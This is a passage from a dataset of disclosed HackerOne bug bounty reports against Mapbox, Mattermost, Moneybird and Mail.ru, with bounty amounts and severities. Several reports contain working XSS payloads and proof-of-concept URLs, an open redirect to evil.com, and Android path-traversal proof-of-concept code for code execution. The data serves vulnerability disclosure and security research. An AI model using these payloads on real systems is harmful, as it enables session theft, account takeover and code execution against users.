2) Mail.ru server could use the ""oversign"" solution (suggested in RFC 6376 section 8.15) for outgoing messages,  i.e., repeat important headers, to prevent replay attacks, such as using “h=from:from:subject:subject:to:to. . ."". This will prevent attackers from replaying Mail.ru DKIM signatures on other email providers.  According to our testing, Yahoo.com has adopted this solution.
Impact
A regular user of email services may send DKIM-signed messages as any other user (e.g., administrator) of the domain to a Mail.ru recipient.
Apart from Mail.ru,  this attack can also be used to forge DKIM signatures of other email services, such as Gmail, Outlook, and other public or private services, to a Mail.ru recipient",https://hackerone.com/reports/731878,Moscow,Russia,Moscow,2019,11,8,1,7
Mapbox,501-1000,0.0,10m-50m,$400.00,No value,0.0,Denial of Service,Denial of service in account statistics endpoint,"apok  submitted a report to Mapbox.May 4th (7 years ago)Hi Mapbox,
I know that your guidelines explicitly say that Denial of Service coinditions are not in scope and should not be attempted, but I maintained the testing between adequate parameters so as to not to create excessive load on your backend. I also sent an email to security@mapbox.com prior to submitting this report and Alex Ulsh and he or she (Sorry, can't know which since Alex is a unisex name hahaha) told me that this could be an exception.
The vulnerability relies on the https://www.mapbox.com/core/statistics/v1/apokh11/account endpoint, it seems that by modifying the ""period"" parameter to an arbitrary value, the amount of data returned increases probably without any limit, furthermore, if the interval is set to ""hour"" instead of ""day"", it is possible to increase the amount of data returned even further. To avoid affecting the availability of the server, I limited my testing to a small period, which still returned around 350 kb of data.
The amount of data can also be increased if the end date of the period requested is set to a point in the future.
To reproduce:
1) Create an account or login to an existing account.
2) Access this URL: https://www.mapbox.com/core/statistics/v1/apokh11/account?interval=day&period=1461766083142%2C1462370883143&metrics=countries%2Cbrowsers%2Chosts%2Cmaps%2Cversion&services=mapview%2Ctile%2Cstatic%2Cgeocode%2Cpermanentgeocode%2Cdirections%2Csurface&_=1462370883155
3) Observe that the amount of data returned is around 2.5 Kb.
4) Modify the ""interval"" parameter to ""hour"" and the ""Period"" parameter to, for example ""1451766083142,1462370883143""
5) Observe that the amount of data returned increased to 372 Kb. 
Not tested: If the period is long enough, the amount of time taken to answer the request will probably be increased as well.
Implication: A malicious individual could leverage this feature by asking for extended periods to cause high loads on the backend, which in turn could affect the availiability of the service.
Recommendation: Limit the period length to an amount established by the business logic, so as to mitigate the possibility of using this functionality with malicious intent.
Let me know if you require any additional tests and/or information.
Kind Regards,
Apok.4 attachments:F91460: Denial_of_Service_Condition_First_request.pngF91461: Denial_of_Service_Condition_First_response.pngF91462: Denial_of_Service_Condition_Second_request.pngF91463: Denial_of_Service_Condition_Second_response.png",https://hackerone.com/reports/136221,Washington,United States,Washington,2016,5,4,14,35
Mapbox,501-1000,0.0,10m-50m,$200.00,No value,0.0,Improper Authentication - Generic,Mapbox API Access Token with No Scope Can Read Styles,"bugs3ra  submitted a report to Mapbox.Mar 10th (7 years ago)HI
I created one api token with 0 scope.
Then I sent the following request to server
GET /styles/v1/katilthe?access_token=pk.eyJ1Ijoia2F0aWx0aGUiLCJhIjoiY2lsbWJwcWpjNjhmNnZubWNhYXdwZm5obyJ9.2cPnaIiXcFnDRFMfrD1TRw HTTP/1.1
Host: api.mapbox.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.mapbox.com/studio/styles/fonts/
Origin: https://www.mapbox.com
Connection: keep-alive
I Got 200 OK in response and my styles.
[{""version"":8,""name"":""test\""><svg/onload=alert(2)>-copy-copy"",""center"":[-78.90145050000001,33.70101199999998],""zoom"":12,""bearing"":0,""pitch"":0,""created"":""2016-03-10T13:45:51.193Z"",""id"":""cilmbusls00cvc6m23qpi69gg"",""modified"":""2016-03-10T13:45:51.193Z"",""owner"":""katilthe""},{""version"":8,""name"":""test\""><svg/onload=alert(2)>-copy"",""center"":[0,-1.1368683772161603e-13],""zoom"":0.3106126682923422,""bearing"":0,""pitch"":0,""created"":""2016-03-10T13:43:58.005Z"",""id"":""cilmbsd9s00cfc7mcl1m7nnrz"",""modified"":""2016-03-10T13:43:58.005Z"",""owner"":""katilthe""}]2 attachments:F77764: api.JPGF77765: req_response.JPG",https://hackerone.com/reports/122050,Washington,United States,Washington,2016,3,10,14,9
Mapbox,501-1000,0.0,10m-50m,$500.00,Medium,5.45,Improper Authentication - Generic,Open Aws Amazon S3 Buckets,saadahmedx  submitted a report to Mapbox.Apr 21st (6 years ago)ianshward Mapbox staff  posted a comment. Apr 21st (6 years ago)saadahmedx   posted a comment. Apr 21st (6 years ago)ianshward Mapbox staff  changed the status to Triaged. Apr 22nd (6 years ago)saadahmedx   posted a comment. Apr 22nd (6 years ago)Mapbox  rewarded saadahmedx with a $500 bounty. Apr 24th (6 years ago)ianshward Mapbox staff  closed the report and changed the status to Resolved. Apr 24th (6 years ago)saadahmedx   posted a comment. Apr 24th (6 years ago)kmahoney   requested to disclose this report. Apr 25th (6 years ago)saadahmedx   agreed to disclose this report. Apr 25th (6 years ago)  This report has been disclosed. Apr 25th (6 years ago)amalyoman   filed a duplicate (#301259) and was invited to participate in this report. Dec 31st (5 years ago),https://hackerone.com/reports/222724,Washington,United States,Washington,2017,4,21,10,44
Mapbox,501-1000,0.0,10m-50m,$750.00,Medium,5.45,Information Disclosure,Public access to objects in AWS S3 bucket,ehsahil  submitted a report to Mapbox.Feb 1st (6 years ago),https://hackerone.com/reports/202725,Washington,United States,Washington,2017,2,1,22,20
Mapbox,501-1000,0.0,10m-50m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Persistent cross-site scripting (XSS) in map attribution,"ph3t  submitted a report to Mapbox.Apr 2nd (8 years ago)Hello,
I have found a Persistent Cross Site Scripting vulnerability when using a custom style uploaded by myself.
Mapbox Studio allows create and upload styles for your maps. So if we create a new style with javascript code as attribution value it will be executed when loading a map that uses our evil style. I used the following javascript code for testing:

""><img src=x onerror=alert(document.cookie)>

To reproduce this vulnerability you must download the Mapbox Studio from here. Then you must write a random name and description. In the Attribution field you must inject the javascript code you want to execute. Save the changes again, upload the project and close the Mapbox Studio.
Now, log into your Mapbox account and go to Styles, select the style you have just created, this will expand the div, and click on ""New project"". The code will be already executed, but the vulnerability is not as much exploitable as we want.
We want everybody can execute our javascript code so, choose the settings you want in the project we created and save it. Go to your project list and search the project we have just saved. If we share this project, everybody who access to it will execute the code we have injected, including people without Mapbox account.
PoC: https://api.tiles.mapbox.com/v4/pr0ph3t.lkag551j/page.html?access_token=pk.eyJ1IjoicHIwcGgzdCIsImEiOiJuRlQ1RDk0In0.qWRU_9DCEAMsAYIEpNTpnw#3/0.00/0.00
Demo video: https://youtu.be/NHjTqjndRik
Regards,
Juan Broullón Sampedro.",https://hackerone.com/reports/54327,Washington,United States,Washington,2015,4,2,0,56
Mapbox,501-1000,0.0,10m-50m,$300.00,Low,2.0,Information Disclosure,Node modules path disclosure due to lack of error handling,apapedulimu  submitted a report to Mapbox.May 2nd (6 years ago),https://hackerone.com/reports/225537,Washington,United States,Washington,2017,5,2,13,7
Mapbox,501-1000,0.0,10m-50m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected cross-site scripting (XSS) on api.tiles.mapbox.com,"dawgyg  submitted a report to Mapbox.Apr 28th (7 years ago)There is a reflective XSS vulnerability in the access_token param found in the page.html at api.tiles.mapbox.com
A proof of concept link:
http://api.tiles.mapbox.com/v4/ctswebrequest.m4ga59jd/page.html?access_token=pk.eyJ1IjoiY3Rzd2VicmVxdWVzdCIsImEiOiJTb19VUHM0In0.muGg6tMDG4NOGrV4qQQ8yw.htaccess.aspx%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E#11/39.9168/-75.15951 attachment:F90073: mapbox.jpg
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. Apr 28th (7 years ago)Also this was tested on Fedora Core 20 Linux running Firefox 38.0.5alulsh Mapbox staff  changed the status to Triaged. Apr 28th (7 years ago)@dawgyg - this is an awesome find! I can confirm this is an issue in Firefox only (Firefox 46.0 on Max OS X). I also tested on Internet Explorer, Chrome, Opera, and Safari and they are not affected by this issue.
I have fixed the issue locally and am working on getting this patch deployed to our production servers as soon as possible.alulsh Mapbox staff  changed the report title from Reflective XSS Vuln on api.tiles.mapbox.com to Reflected cross-site scripting (XSS) on api.tiles.mapbox.com. Apr 28th (7 years ago)
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. Apr 28th (7 years ago)Sounds good. If you need any additional information I am available. Thanks for the quick response time!
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. Apr 28th (7 years ago)http://api.tiles.mapbox.com/v4/ctswebrequest.m4ga59jd/page.html?access_token=pk.eyJ1IjoiY3Rzd2VicmVxdWVzdCIsImEiOiJTb19VUHM0In0.muGg6tMDG4NOGrV4qQQ8yw.htaccess.aspx%27><img%20src=a:alert(document.domain)%20onerror=eval(src)>#11/39.9519/-75.0949
This link appears to work on chrome on the galaxy s7 alulsh Mapbox staff  posted a comment. Apr 29th (7 years ago)@dawgyg - we just deployed a fix to our servers. Can you verify the issue has been resolved?
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. Apr 30th (7 years ago)Yes this now appears fixed. I can no longer reproduce the issue.
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. May 2nd (7 years ago)Can we disclose this publically now that the problem has been fixed?alulsh Mapbox staff  closed the report and changed the status to Resolved. May 2nd (7 years ago)
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. May 2nd (7 years ago)Will this be eligible for a bounty?Mapbox  rewarded dawgyg with a $1,000 bounty. May 2nd (7 years ago)
    
    
        
            
                
                
                
            
        
    
dawgyg   posted a comment. May 2nd (7 years ago)Thank you!dawgyg   requested to disclose this report. May 3rd (7 years ago)alulsh Mapbox staff  agreed to disclose this report. Jun 1st (6 years ago)  This report has been disclosed. Jun 1st (6 years ago)",https://hackerone.com/reports/135217,Washington,United States,Washington,2016,4,28,16,2
Mapbox,501-1000,0.0,10m-50m,$500.00,Medium,5.4,Cross-site Scripting (XSS) - Reflected,Reflected XSS via XML Namespace URI on https://go.mapbox.com/index.php/soap/,h4ck3d  submitted a report to Mapbox.Jan 22nd (3 years ago),https://hackerone.com/reports/780277,Washington,United States,Washington,2020,1,22,10,5
Mapbox,501-1000,0.0,10m-50m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Stored xss in editor ,"ehsahil  submitted a report to Mapbox.Mar 28th (8 years ago)ehsahil   posted a comment. Mar 28th (8 years ago)jfirebaugh   changed the status to Triaged. Mar 30th (8 years ago)yhahn Mapbox staff  posted a comment. Mar 30th (8 years ago)ehsahil   posted a comment. Mar 31st (8 years ago)willwhite Mapbox staff  closed the report and changed the status to Resolved. Mar 31st (8 years ago)Mapbox  rewarded ehsahil with a $1,000 bounty. Mar 31st (8 years ago)ehsahil   posted a comment. Mar 31st (8 years ago)ehsahil   posted a comment. Jul 24th (5 years ago)alulsh Mapbox staff  posted a comment. Aug 14th (5 years ago)alulsh Mapbox staff  requested to disclose this report. Aug 14th (5 years ago)alulsh Mapbox staff  posted a comment. Aug 17th (5 years ago)alulsh Mapbox staff  disclosed this report. Aug 17th (5 years ago)Summary by ehsahilOn March 28th, 2015, I found a Stored XSS in Mapbox Editor. 
Which was hosted on https://mapbox.com/editor  Mapbox Editor is now deprecated and replaced with Mapbox Studio. (https://mapbox.com/studio).
This Issue was very straight forward. 
Following was the Reproduction Steps. 


Go to: http://mapbox.com/editor


Draw a line on the map using tool bar. 


Give the name to the created line. 


Enter Following JS payload on Name & Description Input Box. 


""><img src=x onerror=prompt(111);>


Save it. 


Reload the Page, Js payload will be executed.   


Exploitation:
You can share the created maps to other Mapbox users and js payload will be executed on the targetted browser. 
Screenshot
https://www.dropbox.com/s/2lxd8fhw1bttwrh/Screen_Shot_2015-03-28_at_9.44.25_AM.png?dl=0
-Sahil",https://hackerone.com/reports/53730,Washington,United States,Washington,2015,3,28,4,16
Mapbox,501-1000,0.0,10m-50m,$600.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Stored XSS | api.mapbox.com | IE 11 | Styles name,renekroka  submitted a report to Mapbox.Dec 24th (3 years ago)renekroka   posted a comment. Dec 24th (3 years ago)h1_analyst_jake HackerOne triage  posted a comment. Dec 24th (3 years ago)renekroka   posted a comment. Dec 24th (3 years ago)renekroka   posted a comment. Updated Dec 24th (3 years ago)renekroka   posted a comment. Dec 28th (3 years ago)renekroka   posted a comment. Jan 7th (3 years ago)nicki_peternel   changed the status to Triaged. Jan 7th (3 years ago)Mapbox  rewarded renekroka with a $600 bounty. Jan 7th (3 years ago)renekroka   posted a comment. Jan 7th (3 years ago)nicki_peternel   posted a comment. Jan 8th (3 years ago)renekroka   posted a comment. Jan 9th (3 years ago)franka_schmidt   updated the severity from high to medium. Jan 13th (3 years ago)franka_schmidt   closed the report and changed the status to Resolved. Jan 13th (3 years ago)renekroka   requested to disclose this report. Jan 13th (3 years ago)franka_schmidt   posted a comment. Jan 21st (3 years ago)franka_schmidt   agreed to disclose this report. Jan 21st (3 years ago)  This report has been disclosed. Jan 21st (3 years ago),https://hackerone.com/reports/763812,Washington,United States,Washington,2019,12,24,0,3
Mapbox,501-1000,0.0,10m-50m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Stored Cross-Site Scripting in Map Share Page,"hussain_0x3c  submitted a report to Mapbox.Jun 1st (7 years ago)Hi Team Mapbox Security
This is Copy From message email ( security@mapbox.com ) 
intro.
I'm Hussain Adnan Researcher Security,
Iam Have  Found  Vulnerability Bug in form project profile ( Map )
Type Vulnerability : Cross-Site Scripting ( Stored - Reflected )
Affected Domain : Affected Domain : mapbox.com - a.tiles.mapbox.com
link Demo to execute : Reflected 
Code 179 BytesWrap lines Copy Download1https://a.tiles.mapbox.com/v4/ibmsecurity.ma91e43j/page.html?access_token=pk.eyJ1IjoiaWJtc2VjdXJpdHkiLCJhIjoiOWI0NDYxYjVmMjYzNjE2Yjc1ODM5NDgxOTBmMTFkODEifQ.EIBxJM1o7YiuI4pgZ7bsjg 
Code javascript  execute   in mapbox.com on form  search map edited.
and  execute    in a.tiles.mapbox.com on URL 
Steps to reproduce
an attacker delete #  from  url  and  get  url  code  execute    Stored  - Reflected
http://im54.gulfup.com/0gseLU.gif

POC   : https://youtu.be/N_4mqOtp07c - http://im54.gulfup.com/0gseLU.gif
Be Safe
Best Regards",https://hackerone.com/reports/65284,Washington,United States,Washington,2015,6,1,18,54
Mapbox,501-1000,0.0,10m-50m,"$12,500.00",Critical,10.0,Command Injection - Generic,Test-scripts for postgis in mason-repository using unsafe unzip of content from unclaimed bucket creates potential RCE-issues,fransrosen  submitted a report to Mapbox.Mar 25th (5 years ago),https://hackerone.com/reports/329689,Washington,United States,Washington,2018,3,25,15,0
Mapbox,501-1000,0.0,10m-50m,$200.00,No value,0.0,Open Redirect,Content Spoofing and Local Redirect in Mapbox Studio,"hussain_0x3c  submitted a report to Mapbox.Feb 3rd (7 years ago)Hi
I'm Found  Bug  It is Possible To Send His message Directly Through URL and Redirect Local .
Details
When you go to :- https://www.mapbox.com/studio/admin/ website redirect to 
Code 118 BytesWrap lines Copy Download1https://www.mapbox.com/studio/forbidden/?message=Sorry,only admins allowed here.&redirect=/studio/&path=/studio/admin/
You can see  parameter message and redirect not safe against the manipulation and interference
# Content Spoofing and Redirect
URL POC 
Code 175 BytesWrap lines Copy Download1https://www.mapbox.com/studio/forbidden/?message=Hi%20You%20Are%20%20Not%20%20in%20Mapbox%20Please%20Go%20%20To%20http://evil.com&redirect=/evil.com/&path=%2Fstudio%2Fadmin%2F
Message Changed and If Click On Okay Redirect on evil.com
Regards
Hussain",https://hackerone.com/reports/114529,Washington,United States,Washington,2016,2,3,23,51
Mapbox,501-1000,0.0,10m-50m,$600.00,No value,0.0,Violation of Secure Design Principles,Logging a user into attacker's account using password reset link,shahmeer-amir  submitted a report to Mapbox.Mar 26th (8 years ago),https://hackerone.com/reports/53531,Washington,United States,Washington,2015,3,26,15,32
Mapbox,501-1000,0.0,10m-50m,$500.00,No value,0.0,Improper Authentication - Generic,Disclosure of map information,hussain_0x3c  submitted a report to Mapbox.Jul 11th (7 years ago)Summary by hussain_0x3cAPI Bug :- Ability to detect users account information,https://hackerone.com/reports/74933,Washington,United States,Washington,2015,7,11,9,51
Mapbox,501-1000,0.0,10m-50m,$750.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Blind XSS in mapbox.com/contact,ehsahil  submitted a report to Mapbox.Aug 11th (6 years ago),https://hackerone.com/reports/158461,Washington,United States,Washington,2016,8,11,13,7
Mapbox,501-1000,0.0,10m-50m,"$1,000.00",Low,2.0,Information Disclosure,Mapbox Android SDK uses Broadcast Receiver instead of Local Broadcast Manager,mishre  submitted a report to Mapbox.Dec 20th (6 years ago),https://hackerone.com/reports/192886,Washington,United States,Washington,2016,12,20,22,44
Mapbox,501-1000,0.0,10m-50m,"$4,000.00",Critical,9.5,Command Injection - Generic,Admin Panel Accessed (OAuth Bypassed ) ,spoofing  submitted a report to Mapbox.Dec 4th (5 years ago),https://hackerone.com/reports/294911,Washington,United States,Washington,2017,12,4,10,50
Mattermost,101-250,0.0,1m-10m,$150.00,Low,3.7,Use of a Key Past its Expiration Date,Account takeover due to misconfiguration,"akashhamal0x01  submitted a report to Mattermost.Mar 2nd (2 years ago)Summary:
HI team, i hope you are good :)
Its a very simple logical flaw that results in this
So suppose we are victim@gmail.com , now login into the website then

go to account settings and then change mail address to victim111@gmail.com
a link will be sent to victim111@gmail.com, now the user realizes that he have lost access to victim111@gmail.com due to some reasons 
so he will probably change mail to the another mail address for e.g victim999@gmail.com which he owns and has access to
but it is found that even after verifying victim999@gmail.com, the old link which was sent to victim111@gmail.com is active, so user/attacker having access to that mail can verify it and takeover acc

In a nutshell : 
It is mandatory for a web app to invalidate the tokens in time to secure its user 
In this case, suppose while changing mail address the user mistakenly typed wrong mail address, so the link will be sent to that mail address. 
So the user probably don't want the user of that mail address to verify it, so he will quickly change his mail address to one he owns and verify it
what he doesn't know is that even after verification(change of major state), the old link is still active 
the flaw :
user changes mail to attacker@gmail.com -> user realizes that he mistyped the mail -> so he again changes to mail he owns and verifies it -> old link sent to attacker@gmail.com is still active even after new mail has been verified
Impact
An attacker can takeover acc due to misconfiguration, not invalidation of tokens at major state change, in time",https://hackerone.com/reports/1114347,California,United States,Palo Alto,2021,3,2,5,46
Mattermost,101-250,0.0,1m-10m,$900.00,High,7.1,Cross-site Scripting (XSS) - Reflected,Mattermost Server OAuth Flow Cross-Site Scripting,"shielder  submitted a report to Mattermost.Jun 3rd (about 1 year ago)Summary:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the OAuth flow. A victim clicking a malicious link pointing to the target Mattermost host will trigger the XSS. If the victim is a regular user, it is possible to obtain all of their Mattermost chat contents; if it’s an administrator, it is possible to create a new administrator.
Root Cause Analysis:
The application fails to sanitize an HTTP query parameter before reflecting it within the HTML response during the OAuth flow.
Code 657 BytesWrap lines Copy Download1        if props != nil {
2                action = props[""action""]
3                isMobile = action == model.OAUTH_ACTION_MOBILE
4                if val, ok := props[""redirect_to""]; ok {
5[1]                     redirectURL = val
6                        hasRedirectURL = redirectURL != """"
7                }
8        }
9        renderError := func(err *model.AppError) {
10                if isMobile && hasRedirectURL {
11[2]                     utils.RenderMobileError(c.App.Config(), w, err, redirectURL)
12                } else {
13                        utils.RenderWebAppError(c.App.Config(), w, r, err, c.App.AsymmetricSigningKey())
14                }
15        }
The file ""/web/oauth.go"" (https://github.com/mattermost/mattermost-server/blob/master/web/oauth.go) contains the function ""completeOAuth"" which on line 284 values the variable ""redirectURL"" with the parameter ""redirect_to"" [1] of the query string of the HTTP GET request. Subsequently always inside of the same function to the line 291 comes called the function ""utils.RenderMobileError"" to which it comes passed like argument the variable ""redirectURL"" [2].
Code 1.24 KiBWrap lines Copy Download1func RenderMobileError(config *model.Config, w http.ResponseWriter, err *model.AppError, redirectURL string) {
2        RenderMobileMessage(w, `
3                <svg xmlns=""http://www.w3.org/2000/svg"" viewBox=""0 0 576 512"" style=""width: 64px; height: 64px; fill: #ccc"">
4                        <!-- Font Awesome Free 5.15.3 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) -->
5                        <path d=""M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z""/>
6                </svg>
7                <h2> `+i18n.T(""error"")+` </h2>
8                <p> `+err.Message+` </p>
9[1]                <a href=""`+redirectURL+`"">
10                        `+i18n.T(""api.back_to_app"", map[string]interface{}{""SiteName"": config.TeamSettings.SiteName})+`
11                </a>
12        `)
13}
The function ""RenderMobileError"" is contained within the file ""utils/api.go"" (https://github.com/mattermost/mattermost-server/blob/master/utils/api.go) at line 103, and the fourth argument of this function is ""redirectURL"". At line 104 the ""RenderMobileMessage"" function is called and at line 111 the variable ""redirectURL"" is concatenated (without being sanitised) with another string argument of the ""RenderMobileMessage"" function [1].
Code 350 BytesWrap lines Copy Download1[...]
2                        </head>
3                        <body>
4                                <!-- mobile app message -->
5                                <div class=""message-container"">
6[1]                                     `+message+`
7                                </div>
8                        </body>
9                </html>
10        `)
Inside the ""RenderMobileMessage"" function (declared at line 117 of utils/api.go) ""fmt.Fprintln"" is called to print the HTTP response and the HTML page is dynamically built concatenating the ""message"" variable [1] (second argument of the function).
Call graph:
completeOAuth -(redirectURL=redirect_to)-> util.RenderMobileError(,redirectURL) -(message=string+redirectURL)-> RenderMobileMessage(,message) -> fmt.Fprintln(string+message)
Since the HTTP GET request parameter ""redirect_to"" is never sanitized and is appended to the HTML page, it is possible to trigger a reflected XSS.
Steps To Reproduce:


Visit the following URL after replacing <mattermost_url> with the domain/ip of the mattermost server instance:
https://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror=%22alert(%27zi0Black%20@%20Shielder%27)%22%3E


Notice the JavaScript's generated pop-up


Supporting Material/References:

[attachment / F1324661]

Impact
The following attack scenarios have been identified:

If the victim is a regular user, the attacker could read the messages sent and received by the user.
If the victim is an administrative user, the attacker could change the server settings (e.g. add a new administrative user).
1 attachment:F1324661: upload_43235b1bc0e676092457868cc1e2c7fe.pngSummary by shielderAndrea `zi0black` Cappa of Shielder found a Reflected Cross-Site Scripting (XSS) in the OAuth authentication flow of Mattermost. Once fixed he found a bypass for it which was promptly fixed by the Mattermost team.
The vulnerability could have been abused to hijack a victim session and based on their privileges steal their conversations / send messages (user) and/or add a new administrator on the Mattermost instance (admin).
All the details are available in the advisory published on Shielder's website: https://www.shielder.it/advisories/mattermost-server-reflected-xss-oauth/",https://hackerone.com/reports/1216203,California,United States,Palo Alto,2021,6,3,8,56
Mattermost,101-250,0.0,1m-10m,$750.00,High,7.8,Code Injection,Persistant Arbitrary code execution in mattermost android,"hulkvision_  submitted a report to Mattermost.Mar 3rd (2 years ago)Summary:
Activity com.mattermost.share.ShareActivity is is exported and is designed to allow file sharing from third party application to mattermost android app.
Code 658 BytesWrap lines Copy Download1 <activity android:theme=""@style/AppTheme"" android:label=""@string/app_name"" android:name=""com.mattermost.share.ShareActivity"" android:taskAffinity=""com.mattermost.share"" android:launchMode=""singleInstance"" android:screenOrientation=""portrait"" android:configChanges=""keyboard|keyboardHidden|orientation|screenSize"">
2            <intent-filter>
3                <action android:name=""android.intent.action.SEND""/>
4                <action android:name=""android.intent.action.SEND_MULTIPLE""/>
5                <category android:name=""android.intent.category.DEFAULT""/>
6                <data android:mimeType=""*/*""/>
7            </intent-filter>
8        </activity>
I have found path tansversal vulnerability at com.mattermost.share.RealPathUtil.java  file 
Code 743 BytesWrap lines Copy Download1public static String getPathFromSavingTempFile(Context context, final Uri uri) {
2             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here 
3            returnCursor.moveToFirst();
4            fileName = returnCursor.getString(nameIndex); // ""filename=../../lib-main/libyoga.so""
5        } catch (Exception e) {
6            // just continue to get the filename with the last segment of the path
7       }
8             String mimeType = getMimeType(uri.getPath());
9            tmpFile = new File(cacheDir, fileName);
10            tmpFile.createNewFile();  //path transversal here
11            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, ""r""); 
12            //.../
It receives  the value of _display_name from the provider and saved the file with this name, leading to path-traversal.
## Steps To Reproduce:


Install the POC app and open it. app-release.apk (F1216351)
On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and  to create a modified version of libyoga.so


POC
In MainActivity.java
Code 410 BytesWrap lines Copy Download1        Intent intent = new Intent(Intent.ACTION_SEND);
2        intent.setClassName(""com.mattermost.rn"", ""com.mattermost.share.ShareActivity"");
3        intent.putExtra(""android.intent.extra.STREAM"",Uri.parse(""content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so""));
4        intent.setType(""application/*"");
5        startActivity(intent);
6
In EvilContentProvider.java
Code 498 BytesWrap lines Copy Download1public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
2    MatrixCursor matrixCursor = new MatrixCursor(new String[]{""_display_name""});
3    matrixCursor.addRow(new Object[]{uri.getQueryParameter(""name"")});
4    return matrixCursor;
5}
6
7public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
8    return ParcelFileDescriptor.open(new File(uri.getQueryParameter(""path"")), ParcelFileDescriptor.MODE_READ_ONLY);
9}
In AndroidManifest.xml
Code 143 BytesWrap lines Copy Download1<provider android:name="".EvilContentProvider"" android:authorities=""com.example.android.pocok"" android:enabled=""true"" android:exported=""true"" />
Impact
Attacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.1 attachment:F1216351: app-release.apk",https://hackerone.com/reports/1115864,California,United States,Palo Alto,2021,3,3,15,12
Mattermost,101-250,0.0,1m-10m,$150.00,Low,2.6,Privilege Escalation,Privilege Escalation leading to post in channel without having privilege,"fuzzsqlb0f  submitted a report to Mattermost.Mar 2nd (2 years ago)Hi H1,
mattermost.cloud has a feature of making a channel and once its set to public any other user can join the channel and post comments on that channel. In System Console --> Channel --> Permission channel owner can assign wether member can post comment or not. Once channel owner selects that channel member can not post even than they can post the comment in channel.
Steps To Reproduce:


Step1: user1 █████ created a channel which is public and under System Console --> Channel --> Permission gives guest and members to post comment.


Step2: user2 █████ joined user1 channel mikefourchannel  (already joined)


Step3: user2 posted comment has permission to comment in channel in mikefourchannel  and captured the request and send it to repeater (


Step3: user2 ███████ also created a channel privilegeescalation (already done)


Step4: user1 █████ and under System Console --> Channel --> Permission  guest and members removes right to comment.


Step5: user2 ████████ now can not post any comment This channel is read only. Only members with permission can post here


Step6: user2 ██████ goes to channel privilegeescalation and posted comment and captures the request and used post request which was captured in Step3


Note:
In video POC at time 0:01:42 user2 commenting when he was having privilege of commenting in channel and there is only that comment has permission to comment in channel below there is no other comment now plz go to time 0:04:29  you can see user2 commented commenting in mike4 channel even no privielge in user1 channel without proper privileges
Video POC attached for your reference.
Result:
user2 ███ posted comment in user1 channel mikefourchannel even user2 dosen't have privilege to do so.
Impact
Impact:
Privilege escalation leading to comment on channel.",https://hackerone.com/reports/1114617,California,United States,Palo Alto,2021,3,2,12,21
Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[Stored Cross-Site-Scripting] When search about Incoming ( Manual Jurnal ),bogdantcaciuc  submitted a report to Moneybird.Jul 27th (6 years ago),https://hackerone.com/reports/154397,Overijssel,Netherlands,Enschede,2016,7,27,17,3
Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,"[STORED XSS] in debtor reports of ,,invoices''",bogdantcaciuc  submitted a report to Moneybird.Jun 3rd (6 years ago),https://hackerone.com/reports/142893,Overijssel,Netherlands,Enschede,2016,6,3,16,52
Moneybird,1-10,0.0,1m-10m,$100.00,High,7.95,Denial of Service,Bypass password reset rate limit protection at moneybird.com/passwords,"osama-hamad  submitted a report to Moneybird.Oct 28th (3 years ago)Summary by osama-hamadInjecting X-Forwarded-For : Header with random values leads to bypass rate limit protection 429 on the web application endpoints causing several attacks like brute force , email leakage , dos , email flooding ..etc",https://hackerone.com/reports/723974,Overijssel,Netherlands,Enschede,2019,10,28,13,0
Moneybird,1-10,0.0,1m-10m,$50.00,No value,0.0,Command Injection - Generic,CSV Injection with the CSV export feature,trabajoduro  submitted a report to Moneybird.Apr 13th (7 years ago),https://hackerone.com/reports/130338,Overijssel,Netherlands,Enschede,2016,4,13,14,39
Moneybird,1-10,0.0,1m-10m,$100.00,No value,0.0,Improper Authentication - Generic,Employees with Any Permissions Can Create App with Full Permissions and Perform any API Action,yaworsk  submitted a report to Moneybird.May 3rd (7 years ago),https://hackerone.com/reports/135989,Overijssel,Netherlands,Enschede,2016,5,3,16,6
Moneybird,1-10,0.0,1m-10m,$100.00,Medium,4.4,Denial of Service,Enable 2FA without verifying the email,"rioncool22  submitted a report to Moneybird.Jul 18th (3 years ago)Description :
I able to add 2FA to my account without verifying my email
Attack scenario :

Attacker sign up with victim email (Email verification will be sent to victim email).
Attacker able to login without verifying email.
